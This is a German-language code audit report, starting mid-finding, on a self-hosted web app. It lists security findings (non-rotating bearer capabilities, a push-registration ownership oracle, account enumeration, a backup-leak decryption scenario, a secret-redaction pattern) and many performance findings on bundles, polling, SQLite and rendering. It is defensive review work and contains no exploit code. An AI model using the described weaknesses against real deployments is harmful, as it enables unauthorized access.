**Empfohlene Loesung:** `environment`-Allowlist + `redactText` vor Speichern + Report-Limit (S-009); DevServer-Logs/Diagnose durch `redactText` (token|secret|password|api-key-Muster); Audit-Scope erweitern (Terminal-Creates, Account-Switches, T3-Wechsel, Preview-Starts, mind. Session-Create via WS); Secret-Loesch-Flow (Revision-/Backup-Prune) oder Doku.
**Betroffene Architekturentscheidungen:** Zentrale Redaction-Policy; Audit-Event-Modell.
**Alternativen:** Nur Doku („keine Secrets einfuegen") — Trade-off: verhindert nichts.
**Trade-offs:** Over-Redaction vs Diagnose (Allowlist balancieren).
**Implementierungsschritte:** 1. Allowlist+Redaction Report. 2. Log-Scrubbing. 3. Audit-Events. 4. Prune-Flow/Doku.
**Tests:** Report mit `API_KEY` → `***`; Log mit `token=` → redigiert; Terminal-Create via WS → Audit-Eintrag.
**Akzeptanzkriterien:** Keine Klartext-Secrets in DB/Logs/Backups; privilegierte Aktionen auditiert.
**Abhaengigkeiten:** S-009, Q-004, Abschnitt 12.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low-Medium

### S-015 Token-/Capability-Modell: keine Rotation, kein Replay-Schutz, Enumeration

**Kategorie:** Security (Session/Token, Enumeration)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/previews/keys.ts:10-83`, `.../services/editorOpen.ts:29-82`, `.../hermes/token.ts:14-44`, `.../notifications/push.ts:44-59,203-230`, `.../terminal/protocol.ts:1-42`, `.../usage/routes.ts:42-43`
**Betroffene Funktionen oder Komponenten:** Doctor-/Editor-Capability (32 Bytes, 0600, `timingSafeEqual`, keine Rotation/Expiry), Hermes-Session-Token (HTML-Regex, kein Pinning), Push-`register`/`unregister`, Terminal-`requestId`, `GET /accounts*`
**Problembeschreibung:** Kein Login-Flow/Session-Cookies/Rotation/Expiry/Replay-Liste by Design (Tailscale = Session). Capabilities langzeitgueltige Bearer (Rotation nur Datei-Loeschung + Restart). Hermes-Token fragil gescrapt. Push-`register` ohne Proof-of-Possession; `existing.userId !== userId` → `registered:false` verraet Besitz (Orakel). `GET /accounts/discover` + `GET /accounts` listen E-Mails/Pfade/Plaene (Enumeration). Keine Webhook-Signaturen (Same-Origin + Lease statt HMAC — angemessen, aber kein Replay-Schutz ausser Lease).
**Technische Ursache:** Minimal-Auth ohne Lebenszyklus.
**Ausloeser:** Gestohlene Capability-Datei (gleiche UID lesbar, Backup kopiert sie?) → dauerhafter Zugriff; Push-Raten → Besitz-Orakel.
**Beispielszenario:** Backup von `data/` mit `preview-agent-capability` + `vapid.json` + `preview-storage.key` → Offline-Entschluesselung Snapshots (AES-256-GCM), Push, Doctor — ohne Ablauf.
**Auswirkungen:** Langlebige Kompromittierung bei Datei-Leak; Privacy-Leak via Listen.
**Warum es leicht uebersehen wird:** 0600 + `timingSafeEqual` wirken „fertig".
**Empfohlene Loesung:** Rotation dokumentieren + CLI (`rotate-preview-secrets.sh`: loeschen, Restart, Re-Key/Verwerfen); Push-`register` generische Antwort (kein Orakel); `GET /accounts*` E-Mails/Pfade nur Admins, sonst maskiert; Hermes `Host`-Pinning + TLS beibehalten.
**Betroffene Architekturentscheidungen:** Capability-Lebenszyklus (TTL 1 h/Auto-Rotate als Alternative).
**Alternativen:** Kurzlebige Capabilities (TTL, Auto-Rotate) — Trade-off: Doctor-Komfort (Datei-basiert, machbar).
**Trade-offs:** Rotation bricht aktive Sessions (planen).
**Implementierungsschritte:** 1. Rotations-Doku+CLI. 2. Generische Push-Antwort. 3. Maskierung. 4. Leak-Simulationstest.
**Tests:** Nach Rotation ungültig; fremde Endpoint → keine Offenbarung; Non-Admin → maskiert.
**Akzeptanzkriterien:** Rotation moeglich + dokumentiert; kein Enumerations-Orakel.
**Abhaengigkeiten:** S-002.
**Geschaetzter Umfang:** Small-Medium
**Risiko bei der Umsetzung:** Low

### Zusaetzlich geprueft ohne akuten Fund (Security-Haertung gut)

SQL/NoSQL-Injection (durchgehend Prepared `?`; `tableName`-Interpolation nur feste Strings; kein NoSQL-Store). Command-Injection via `execFile` (feste Arg-Arrays; `shellQuote` korrekt — nur Inhalt aus Projekt, S-013). Client-Werte ueberwiegend serverseitig Zod-validiert (Dimensionen, UUIDs, `projectId`-Regex, Slot 1..128, `mainPort` vs `allowedProjectPorts`, Orbit 4 MB + Destruktiv-Schutz, Revision-Tx, `runtimeId`-UUID + Reattach-Pruefung). Luecke: `createAccount.profilePath` nur `startsWith("/")`, keine Root-Pruefung. Secrets im Repo/Build: `.gitignore` ok (`.env`, `*.local.json`), `.env.example` ohne Secrets, `dist` ohne Secrets (Stichprobe), 0600 auf `.env`/`wrapt.local.json`. Security-Header: Helmet + restriktive CSP, `X-Request-Id`, API `no-store` (Ausnahmen Proxys/Gateway: S-005/S-007). Keine Passwoerter (Tailscale); Capabilities 256-bit + `timingSafeEqual`. Overrides bekannter CVEs vorbildlich; `security:audit` in Pipeline.

### P-001 First Load: Entry zieht KaTeX-Fonts + 22 Preloads eager

**Kategorie:** Performance (First Load/Bundle)
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/web/dist/index.html`, `apps/web/dist/build-manifest.json`, `apps/web/src/index.css:1-6`, `apps/web/vite.config.ts:70-89`, `apps/web/src/main.tsx` (`preloadDashboardArtwork()`)
**Betroffene Funktionen oder Komponenten:** Vite-Entry-Graph
**Problembeschreibung:** Entry listet alle KaTeX-Fonts (~90 Assets) + alle `jetbrains-mono`-Subsets (cyrillic/greek/vietnamese/latin-ext, je 400–700) als Initial-Chunk-Assets, obwohl nur `de` gebraucht. 22 `modulepreload`. CSS ~538 kB. Gemessen: 8,26 MB JS + 1,74 MB CSS vor Lazy-Routes.
**Technische Ursache:** `@fontsource`-Voll-Imports ohne Subset; `katex` transitiv via `@tiptap/extension-mathematics`; kein `manualChunks`/Subset-Filter.
**Ausloeser:** Kaltstart, auch ohne Notizen/Math-Nutzung.
**Auswirkungen:** First Load + LCP + Tailscale-Volumen unnoetig hoch.
**Warum es leicht uebersehen wird:** Fonts „gehoeren dazu"; Entry-Graph unsichtbar.
**Empfohlene Loesung:** Nur `latin`+`latin-ext`; KaTeX + `extension-mathematics` in `NoteEditor`-Chunk (dynamisch); `modulepreload` auf kritischen Pfad, Rest `prefetch`.
**Betroffene Architekturentscheidungen:** Font-/Chunk-Strategie.
**Alternativen:** Nur Preload-Reduktion — Trade-off: Fonts bleiben.
**Trade-offs:** Gering (Splitting, Fallback-Preload).
**Implementierungsschritte:** 1. Subset-Imports. 2. KaTeX lazy. 3. Preload-Kuratierung. 4. Budget-Test.
**Tests:** Lighthouse Kalt/Warm; `vite-bundle-visualizer`-Regression (Fail bei +50 kB Entry).
**Akzeptanzkriterien:** Entry ohne KaTeX-Fonts; Math laedt lazy; Entry-JS <200 kB gzip; Font-Assets im Entry <10; LCP −30 %.
**Abhaengigkeiten:** P-002 (Chunks) gemeinsam.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low

### P-002 Bundle: 1,2 MB NoteEditor, kein Budget, Duplikat-Retention verdoppelt Platte

**Kategorie:** Performance (Bundle/Code-Splitting)
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/web/dist/assets/NoteEditor-*.js` (1.242.746 B ×2), `WebTerminal` 357 kB ×2, `OrbitWorkbench` 314 kB ×2, `apps/web/src/lib/routeModules.ts`, `.../extensions/legacyPageRoutes.ts:58-81`, `apps/web/scripts/compress-dist.mjs:44-45,136-148`
**Betroffene Funktionen oder Komponenten:** `loadRouteWithRecovery()`, `compress()`, `currentManifestFiles()`
**Problembeschreibung:** Keine `manualChunks`, kein Bundle-Budget in CI. `emptyOutDir:false` + `maximumReleases=3`/24-h-Retention behalten alte Hash-Chunks (2–4 Kopien je Route; 21 MB statt ~10 MB). NoteEditor 1,2 MB (Tiptap 20 Extensions + lowlight + highlight.js + katex); `drag-handle-react` zieht `yjs`/`prosemirror`.
**Technische Ursache:** Zero-Downtime-Strategie ohne Groessen-Gegenmassnahme.
**Ausloeser:** Jeder Build/Restart.
**Auswirkungen:** Platte waechst; `statSync`-Scan in `web-build-metrics.ts` langsamer; Mobile-First-Load leidet.
**Warum es leicht uebersehen wird:** Retention als „Sicherheit" erklaert Groesse weg.
**Empfohlene Loesung:** `manualChunks` (tiptap/xterm/xyflow/katex-lowlight); `extension-drag-handle-react`/`yjs`-Bedarf pruefen (nur `BlockMenu.tsx:2` nutzt `DragHandle`); CI-Budget (Fail bei NoteEditor.gz >450 kB, index.js.gz >150 kB).
**Betroffene Architekturentscheidungen:** Chunk-/Retention-Policy (behalten + Budget).
**Alternativen:** Nur Budget ohne Chunks — Trade-off: stoppt Wachstum, schrumpft nicht.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. `manualChunks`. 2. Drag-Handle-Pruefung. 3. Budget-Job. 4. Retention-Doku.
**Tests:** `test:artifact-retention` + Groessen-Assert; `du -cb`, `.br`/`.gz`-Groessen, Manifest-217-Eintraege.
**Akzeptanzkriterien:** Single-Release ~10–12 MB; gzip Entry −25 %; Retention bleibt mit Budget.
**Abhaengigkeiten:** P-001.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low

### P-003 Dashboard eager + 11 Queries blocken Mount

**Kategorie:** Performance (Wasserfall)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/web/src/extensions/legacyPageRoutes.ts:56-66`, `apps/web/src/views/Dashboard.tsx:755-785`, `DashboardRuntime.tsx`, `DashboardMetricsRuntime.tsx`
**Betroffene Funktionen oder Komponenten:** `bootstrapBuiltinContributions()`, `Dashboard()`
**Problembeschreibung:** Nur Dashboard `eager`, Rest `lazy`. Mount mit 11 parallelen `useQuery` (serverSummary/readiness/metrics/operationalMetrics/services/projects/localPorts/terminalSessions/usageDashboard/commands/dashboardConfig), teils mit Poll-Intervallen. 854-Zeilen-Komponente. Server-`Promise.all` je Besuch.
**Technische Ursache:** Eager-Entscheidung ohne Skeleton-Priorisierung.
**Ausloeser:** Jeder Dashboard-Besuch.
**Auswirkungen:** Mount-Wasserfall.
**Warum es leicht uebersehen wird:** Parallelitaet sieht „schnell" aus.
**Empfohlene Loesung:** Above-the-fold (Server/Status) + Below (Usage/Commands/Ports, lazy/defer nach Idle); `enabled: routeActive && visible` auf Viewport (`IntersectionObserver`) ausweiten.
**Betroffene Architekturentscheidungen:** Lade-Priorisierung.
**Alternativen:** Nur Skeleton — Trade-off: Requests bleiben.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Split. 2. Idle-Defer. 3. Intersection-Gate. 4. Mount-Assert.
**Tests:** Playwright Mount-Assert (max 6 API-Calls initial); Profiler Commit-Dauer.
**Akzeptanzkriterien:** Initial ≤4 Queries, Rest nach ~1 s Idle; LCP gleich/besser.
**Abhaengigkeiten:** P-004.
**Geschaetzter Umfang:** Small-Medium
**Risiko bei der Umsetzung:** Low

### P-004 Polling-Sturm: `no-store` + 1,5–30-s-Intervalle pro Tab

**Kategorie:** Performance (Caching/Wasserfall)
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/web/src/lib/apiClient/transport.ts:36-65`, `.../lib/queryOptions.ts:15-186`, `apps/server/src/app/plugins.ts:42-65`, `apps/server/src/config/settings.ts:66-69,75-78`
**Betroffene Funktionen oder Komponenten:** Alle GET (`cache:no-store`); Intervalle: Terminal 3 s, Metrics/Services/Ports 5 s, HermesTasks 6 s, Notifications 15 s, PreviewDevServer 2 s, Logs 1,5 s, Note-Detail 3 s + `refetchOnWindowFocus` bei Usage/Notes
**Problembeschreibung:** Jeder GET umgeht HTTP-Cache. 3 Tabs ≈ 60–135 Req/Min gegen gemeinsames 1200-Budget (alles 127.0.0.1 hinter Tailscale). Ab ~25–30 offenen Tabs 429-Risiko (10 Nutzer × 3 Tabs). Server: `systeminformation` + `ss` + SQLite-Leses pro Poll.
**Technische Ursache:** Frische ohne Dedupe/Visibility-Gating; `staleTime` nicht auf Server-Cache (5/10/30 s) abgestimmt.
**Ausloeser:** Normale Mehr-Tab-Nutzung.
**Auswirkungen:** Identische Requests, 429, CPU-Sockel.
**Warum es leicht uebersehen wird:** Pro Tab „harmlos"; Shared-Budget unsichtbar.
**Empfohlene Loesung:** `refetchIntervalInBackground:false` ueberall ausser Usage; hidden-Intervalle staffeln (Terminal 3→5 s, Logs 1,5→3 s); `staleTime` ≥ `refetchInterval`; `AbortSignal.timeout(30s)` vs Server-`REQUEST_TIMEOUT 3s` abgleichen.
**Betroffene Architekturentscheidungen:** Poll-Topologie (spaeter Push statt Poll, Abschnitt 9).
**Alternativen:** Nur Intervalle erhoehen — Trade-off: Frische leidet sichtbar.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Background-Flags. 2. Staffelung. 3. staleTime-Abgleich. 4. E2E-Dedup-Assert.
**Tests:** E2E 2 Tabs: keine doppelten `localPorts`/`metrics` in 5-s-Fenster; 429-Rate; `browser_network_requests`/Min/Tab.
**Akzeptanzkriterien:** ≤15 Req/Min/Tab idle; 0 identische Doppel-Calls im 5-s-Fenster; gleiche Frische am sichtbaren Tab.
**Abhaengigkeiten:** S-009, P-013/P-017.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### P-005 Zustand: Voll-Dokument-Subscriptions → Voll-Re-Render

**Kategorie:** Performance (Re-Render)
**Schweregrad:** High
**Sicherheit der Einschaetzung:** Medium-High
**Betroffene Dateien:** `apps/web/src/components/Sidebar.tsx:167,256`, `.../views/OrbitWorkbench.tsx:248,280-287,108`, `.../stores/orbit.ts:287-574`, `PreviewContextIsland:99-101`, `flowNode`
**Betroffene Funktionen oder Komponenten:** `useOrbitStore()`, `updateNode()`, `setViewport()`, `setWorldBounds()`
**Problembeschreibung:** Sidebar + Workbench subscriben `document` als Ganzes. Jeder Drag/Pan/Reload (`slots.forEach(updateNode)`) erzeugt neues `boards`-Array → alle Consumer rendern neu. `PreviewContextIsland` filtert/sortiert pro Render. `flowNode` baut ggf. `createOrbitBoardIndex(board)` neu (O(n) je Node).
**Technische Ursache:** Fehlende Selektoren + keine transienten Viewport-Updates.
**Ausloeser:** Pan/Zoom, Drag, Preview-Reload.
**Auswirkungen:** Jank ab ~100 Nodes (Limit 600/1200).
**Warum es leicht uebersehen wird:** Kleine Boards flüssig; Profiler selten an.
**Empfohlene Loesung:** Selektoren (`activeBoardId`/`focusedNodeId`/`revision`); Viewport in Ref/transient Store; `boardIndex` per `useMemo` teilen (Drag-Pfad cachen); `PreviewContextIsland` memoisieren.
**Betroffene Architekturentscheidungen:** Store-Schnitt (mit A-006).
**Alternativen:** Nur Memo — Trade-off: Ursache bleibt.
**Trade-offs:** Zustands-Umbau (mittel).
**Implementierungsschritte:** 1. Selektoren. 2. Transient Viewport. 3. Index-Cache. 4. Profiler-Tests.
**Tests:** Vitest `orbit.test.ts`; Playwright Drag-Profil (max 2 Commits/Frame); RenderCount.
**Akzeptanzkriterien:** Pan ohne `OrbitNodeView`-Re-Render; Drag 60 fps bei 200 Nodes.
**Abhaengigkeiten:** A-006, P-006.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Medium

### P-006 Orbit-Canvas: O(n²)-Pfad bei 600 Nodes

**Kategorie:** Performance (Render-CPU)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** Medium Confidence
**Betroffene Dateien:** `apps/web/src/views/OrbitWorkbench.tsx:127-150,438,824,845,954,960`, `.../lib/orbitBoardIndex.ts`, `orbitSnap.ts`, `orbitTerritory.ts`
**Betroffene Funktionen oder Komponenten:** `flowNode()`, `orbitSnapPreview`, Bounds-Expansion
**Problembeschreibung:** `flowNode()` ohne `index` baut Index neu; Snap + Index im PointerMove; Bounds + `viewportsEqual` pro Frame.
**Technische Ursache:** Hauptpfad memoisiert, Drag/Snap-Pfad nicht.
**Ausloeser:** Drag bei grossem Board; Mobile-Canvas-Modi.
**Auswirkungen:** CPU-Spitzen schwacher Geraete.
**Warum es leicht uebersehen wird:** Hauptpfad-Memos suggerieren Abdeckung.
**Empfohlene Loesung:** Index-Instanz ueber Drag-Session cachen; Snap-Throttling via `rAF` (vorhanden, ausweiten); `onlyRenderVisibleElements` pruefen.
**Betroffene Architekturentscheidungen:** Canvas-Update-Pfad.
**Alternativen:** Nur Throttling — Trade-off: Index-Kosten bleiben.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Session-Cache. 2. rAF-Snap. 3. Bench 600 Nodes.
**Tests:** `orbitCanvasInteraction.test.ts` + Bench; `performance.now()` um flow/snap, Ziel p95 <8 ms bei 300 Nodes.
**Akzeptanzkriterien:** Kein Snap-Verlust; Frame-Budget eingehalten.
**Abhaengigkeiten:** P-005.
**Geschaetzter Umfang:** Small-Medium
**Risiko bei der Umsetzung:** Low

### P-007 Orbit-Sync: 4 MB JSON pro Save + localStorage pro Keystroke

**Kategorie:** Performance (Serialisierung)
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/web/src/components/orbit/OrbitSync.tsx:59-110`, `apps/server/src/orbit/database.ts:73,133-228`
**Betroffene Funktionen oder Komponenten:** Autosave (700 ms debounce), Konflikt-Check via doppeltes `JSON.stringify`, `localStorage`-Draft bei jedem `dirty`
**Problembeschreibung:** Voll-Dokument bis 4 MB je Save (Upload + Zod-Parse + SQLite-Write + Revisions-Insert). Konflikt-Check 2×4 MB CPU. Draft im `localStorage` (Quota 5 MB!) bei jedem Dirty.
**Technische Ursache:** Kein Delta-/Patch-Protokoll; grobes Revisions-Lock.
**Ausloeser:** Grosses Board + Tippen.
**Auswirkungen:** Upload/CPU-Spitzen; Mobile-Safari-Quota-Risiko.
**Warum es leicht uebersehen wird:** Debounce wirkt „sparsam".
**Empfohlene Loesung:** Draft nur Revision + Dirty-Flag, Voll-Dump throtteln; clientseitiger Groessen-Guard (>3,5 MB → warnen, `markSaveBlocked`); langfristig JSON-Patch (mit A-007).
**Betroffene Architekturentscheidungen:** Sync-Protokoll (mit A-007).
**Alternativen:** Nur Guard — Trade-off: schnell, kein Patch.
**Trade-offs:** Patch mittel (mit A-007).
**Implementierungsschritte:** 1. Draft-Throttle. 2. Guard. 3. Patch-Evaluierung.
**Tests:** E2E grosses Board; `Content-Length`-Assert; Longtask-Messung. Ziel: Save <500 kB p95 oder Warnung; kein Write >1/s.
**Akzeptanzkriterien:** Keine Datenverluste; Konflikt-Dialog bleibt.
**Abhaengigkeiten:** A-007.
**Geschaetzter Umfang:** Small (Guard) / Large (Patch)
**Risiko bei der Umsetzung:** Medium (Patch)

### P-008 Assets/Layout-Shift: 1,3 MB Artwork + ungesubsettete Fonts

**Kategorie:** Performance (CLS/LCP)
**Schweregrad:** Low-Medium
**Sicherheit der Einschaetzung:** Medium Confidence
**Betroffene Dateien:** `apps/web/src/assets/dashboard-artwork/` (38 Files, 1,3 MB src), `.../lib/dashboardArtworkPreload.ts`, `.../lib/dashboardArtwork.ts`, `.../main.tsx:34`, `apps/web/vite.config.ts:87-88`
**Betroffene Funktionen oder Komponenten:** Artwork-Preload (240 vs 510 ms belegt)
**Problembeschreibung:** Preload-Strategie gut, aber Hero-WebPs + Fonts ohne `swap`/`size-adjust`-Kontrolle; `route-skeleton` ohne Reservierung → CLS-Varianz.
**Technische Ursache:** Keine systematische CLS-Messung.
**Ausloeser:** Dashboard mit/ohne Artwork.
**Auswirkungen:** LCP-Varianz, Mobile-Shift.
**Warum es leicht uebersehen wird:** Preload-Zahl sieht „optimiert" aus.
**Empfohlene Loesung:** Grid mit `aspect-ratio` + `content-visibility`; Fonts `display=swap`; `preload` nur wenn `artworkEnabled`.
**Betroffene Architekturentscheidungen:** Keine (Darstellung).
**Alternativen:** Keine.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Ratios. 2. Font-display. 3. Conditional preload. 4. CLS-Messung.
**Tests:** Lighthouse CLS (Ziel <0,1); Screenshot-Diff.
**Akzeptanzkriterien:** Kein sichtbarer Sprung.
**Abhaengigkeiten:** P-001.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### P-009 Timer/Listener/WS: Mehrfach-Sockets, Intervalle ohne Visibility-Gate

**Kategorie:** Performance (Leaks)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** Medium Confidence
**Betroffene Dateien:** `apps/web/src/components/EditorOpenBridge.tsx:60`, `NotificationCenter.tsx:24` (je eigener WS, `1s*2^retry` bis 15 s, kein Jitter), `.../files/FileManagerSync.tsx:106` (5 s), `lib/useNow.ts:12`, `.../plugins/PluginPreview.tsx:78`, `views/Usage.tsx:151` (1,5 s), `lib/previewBridgeClient.ts:64,240,262`, `components/ToolPanel.tsx:103,124`
**Betroffene Funktionen oder Komponenten:** WS-Reconnect-Loops, `setInterval`s, Bridge-Listener, 6 iframes/Preview-Gruppe + xterm + ReactFlow
**Problembeschreibung:** Zwei unabhaengige WS-Loops + Intervalle laufen auch hidden. Bridge-Timeout 2,5 s-Disposal fragil. Kein zentraler Hub, kein Visibility-Gate (ausser einzeln), kein Jitter → Reconnect-Herd nach Restart.
**Technische Ursache:** Kein WS-Hub; deterministischer Backoff.
**Ausloeser:** Viele Tabs; Backend-Restart.
**Auswirkungen:** Wachsende Sockets/Timer; Herd mit 429.
**Warum es leicht uebersehen wird:** Pro Komponente „ein Interval" — Summe unsichtbar.
**Empfohlene Loesung:** WS-Hub teilen; Backoff mit Jitter (`+Math.random()*1000`, wie Orbit-Retry); Intervalle pausieren wenn hidden/inaktiv.
**Betroffene Architekturentscheidungen:** Realtime-Topologie (Hub).
**Alternativen:** Nur Jitter — Trade-off: Sockets bleiben mehrfach.
**Trade-offs:** Mittel (Hub-Umbau).
**Implementierungsschritte:** 1. Hub. 2. Jitter. 3. Visibility-Gates. 4. Heap-/WS-Count-Tests.
**Tests:** E2E Tab-Wechsel mit Listener-Spy; Ziel: 1 WS/Tab, 0 Timer hidden; Reconnect gestaffelt <30 s ohne 429.
**Akzeptanzkriterien:** Wie Tests.
**Abhaengigkeiten:** P-004/P-017.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Medium

### P-010 SQLite: 1 Datei, 15 Connections, `synchronous=FULL`, kein Retry

**Kategorie:** Performance (DB-Contention)
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/app/dependencies.ts:108-177`, `.../orbit/database.ts:92`, `.../notifications/database.ts:78`, `.../usage/database.ts:23`, `.../filesystem/fileManagerService.ts:52`
**Betroffene Funktionen oder Komponenten:** 15× `new DatabaseSync` auf `settings.databasePath`; `journal_mode=WAL; busy_timeout=5000`
**Problembeschreibung:** Jede Domaene eigene Connection auf dieselbe Datei (sync API blockiert Event-Loop pro Query). `FULL` fsync pro Commit (~2× langsamer als `NORMAL`+WAL). Parallele Writes (Orbit-Save + Polls + Snapshots + Audit) → `SQLITE_BUSY`, 5 s Timeout, dann 500.
**Technische Ursache:** Single-File ohne Write-Serialisierung; haltbarste Einstellung ohne Abwaegungs-Doku.
**Ausloeser:** Parallele Tabs/APIs (ab ~100 kritisch).
**Auswirkungen:** Heute 457 MB + 4 MB WAL, freelist 320 MB → Amplifikation; Busy-Fehler.
**Warum es leicht uebersehen wird:** `FULL` klingt „sicher"; eine Datei „einfach".
**Empfohlene Loesung:** Kurzfristig alle auf `NORMAL` (WAL bleibt haltbar), `busy_timeout` nur fuer Schreib-Tx erhoehen, Writes ueber zentrale Queue; mittelfristig heisse Tabellen splitten + `VACUUM`-Strategie (P-011).
**Betroffene Architekturentscheidungen:** Haltbarkeits-/Perf-Abwaegung (dokumentieren).
**Alternativen:** Nur Queue — Trade-off: fsync-Kosten bleiben.
**Trade-offs:** Haltbarkeits-Doku noetig (mittel).
**Implementierungsschritte:** 1. Pragmas. 2. Queue. 3. Busy-Metrik. 4. Lasttest 10 parallele Saves + Poll.
**Tests:** 0 Busy bei 10 Tabs; p95 Save <300 ms bei 1 MB Doc; `SQLITE_BUSY`-Rate im Log; `freelist_count`.
**Akzeptanzkriterien:** Keine Verhaltensänderung ausser Pragmas + Queue.
**Abhaengigkeiten:** P-011, D-006/D-016.
**Geschaetzter Umfang:** Small-Medium
**Risiko bei der Umsetzung:** Medium

### P-011 Orbit-Revisionen: 500 Vollkopien = 71 MB + freelist-Bloat

**Kategorie:** Performance (Retention)
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/orbit/database.ts:108-263`, `packages/contracts/src/index.ts:1539-1545`
**Betroffene Funktionen oder Komponenten:** `orbit_document_revisions` (RETENTION 500, CONFLICT 100); Backup-Outbox sync im Request-Pfad
**Problembeschreibung:** Jede Revision Vollkopie. 500 Rows = 71 MB. `DELETE ... WHERE revision < ?` ohne `VACUUM` → freelist 78k Pages. Backup-`writeFileSync`/`readdirSync` synchron im Save-Pfad. Worst-Case 4 MB × 500 = 2 GB.
**Technische Ursache:** Einfachste Historie (kein Diff, kein `auto_vacuum`); Backup im Request.
**Ausloeser:** Regelmaessige Saves.
**Auswirkungen:** Unbegrenztes Wachstum bis Retention, dann Bloat bleibt.
**Warum es leicht uebersehen wird:** Retention-Zahl existiert — Platteneffekt unsichtbar.
**Empfohlene Loesung:** Retention 500→100 (env-steuerbar `ORBIT_REVISION_RETENTION_COUNT` vorhanden); `VACUUM` woechentlich (WAL-online) via Timer/CLI; Backup-Write async (`fs/promises`) aus Request-Pfad.
**Betroffene Architekturentscheidungen:** Rollback-Fenster (100 statt 500 dokumentieren).
**Alternativen:** Nur VACUUM — Trade-off: Wachstum bleibt.
**Trade-offs:** Kuerzeres Fenster (dokumentieren).
**Implementierungsschritte:** 1. Retention-Default. 2. VACUUM-Job. 3. Async-Backup. 4. Groessen-Assert-Test.
**Tests:** Revisions-Retention-Test; `dbstat`/`freelist_count`. Ziel: Tabelle <20 MB, freelist <10 %.
**Akzeptanzkriterien:** Wie Ziele + dokumentiertes Fenster.
**Abhaengigkeiten:** Produktentscheid Fenster (Abschnitt 15, Frage 5).
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### P-012 Notes: `LIKE %q%` Full-Scan ohne FTS, `list()` laedt `content`

**Kategorie:** Performance (Queries)
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/notes/database.ts:174-228`
**Betroffene Funktionen oder Komponenten:** `list()`, `search()`, `escapeLikePattern()`, `createNoteExcerpt()` (JS nach Load)
**Problembeschreibung:** Fuehrendes `%` verhindert Index-Nutzung. `content` (MBs) voll geladen, dann in JS gekuerzt. Keine Pagination. `news_fts` existiert — Notes nutzen kein FTS5.
**Technische Ursache:** MVP-Suche; FTS nur fuer News gebaut.
**Ausloeser:** 1k–10k Notes.
**Auswirkungen:** Heute 26 harmlos; spaeter Sekunden-Latenz + MB-Antworten.
**Warum es leicht uebersehen wird:** Kleine Datenmenge; Escape-Logik sieht „fertig" aus.
**Empfohlene Loesung:** FTS5-Tabelle fuer Notes (wie `news_fts`); `search()` mit `LIMIT 50`; `list()` nur Summary (`substr(content,1,500)`); Index `(archived, updated_at)`.
**Betroffene Architekturentscheidungen:** Such-Backend Notes.
**Alternativen:** Nur LIMIT — Trade-off: Scan bleibt.
**Trade-offs:** Migration (mittel).
**Implementierungsschritte:** 1. FTS-Tabelle + Trigger. 2. LIMIT. 3. Summary-Spalten. 4. Seed-Bench 5k.
**Tests:** Seed 5k; `EXPLAIN QUERY PLAN`; p95 <150 ms, Antwort <200 kB; Escaping-Semantik bleibt.
**Akzeptanzkriterien:** Gleiche Semantik, Scope/CTE erhalten.
**Abhaengigkeiten:** D-003.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Medium

### P-013 Teure Server-Scans pro Poll (`systeminformation` + `ss` + Walk)

**Kategorie:** Performance (CPU-sync)
**Schweregrad:** Medium-High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/services/systemService.ts:31-68,69-71`, `.../services/localPortService.ts:110-238`, `.../projects/activity-service.ts:50-79`, `.../app/dependencies.ts:287`
**Betroffene Funktionen oder Komponenten:** `currentLoad/mem/fsSize/cpuTemperature` (5 s, Cache 30 s); `ss -ltnp` + `HEAD`-Probe 450 ms/Port; Walk (`MAX_FILES 20k`, CONCURRENCY 4, Cache 5 min); `MAX_METRICS_HISTORY 25`
**Problembeschreibung:** Jede Tab-Runde triggert nach Cache-Ablauf `systeminformation` (spawnt `df`, `/proc`), `ss`-Exec + serielle Probes, Filesystem-Walk. Caches pro Prozess, von versetzten Tabs staendig gebustet.
**Technische Ursache:** Poll-Modell ohne Push.
**Ausloeser:** Viele Tabs.
**Auswirkungen:** CPU-Sockel; `localPorts`-p95 mit Port-Anzahl.
**Warum es leicht uebersehen wird:** Caches existieren — Bust-Verhalten unsichtbar.
**Empfohlene Loesung:** TTL leicht erhoehen (Metrics 5→10 s hidden); `list(true)`-Bypass begrenzen; `systeminformation` auf `mem+load` wenn `fsSize` unveraendert; Walk in Worker oder Limit 20k→10k.
**Betroffene Architekturentscheidungen:** Metrics-Pipeline (spaeter Push).
**Alternativen:** Nur TTL — Trade-off: schnell, begrenzt.
**Trade-offs:** Max 10 s alte Hidden-Werte.
**Implementierungsschritte:** 1. TTL. 2. Bypass-Limit. 3. Reduktion. 4. Lasttest 5 Tabs × 60 s (CPU <50 % eines Kerns).
**Tests:** p95 `/local-ports`, `/server/metrics` (<400 ms bei 20 Ports).
**Akzeptanzkriterien:** Dashboard max 10 s alt hidden.
**Abhaengigkeiten:** P-004.
